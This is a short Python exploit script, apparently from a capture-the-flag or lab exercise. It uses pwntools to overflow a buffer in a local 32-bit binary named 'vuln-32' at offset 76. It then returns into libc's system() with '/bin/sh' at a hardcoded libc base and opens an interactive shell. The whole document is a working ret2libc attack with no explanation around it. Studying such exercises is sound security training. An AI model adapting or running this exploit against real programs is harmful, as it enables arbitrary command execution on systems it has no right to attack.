#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

libc = elf.libc
libc.address= 0xf7c00000

SYSTEM = libc.sym['system']
BINSH = next(libc.search(b'/bin/sh'))

# LIBC_BASE = 0xf7c00000
# SYSTEM = LIBC_BASE + 0x4a570
# BINSH = LIBC_BASE + 0x1bcd88

offset = 76

payload = flat(
    b'A' * offset,
    SYSTEM,
    0x0,
    BINSH
)

p.clean()
p.sendline(payload)
p.interactive()
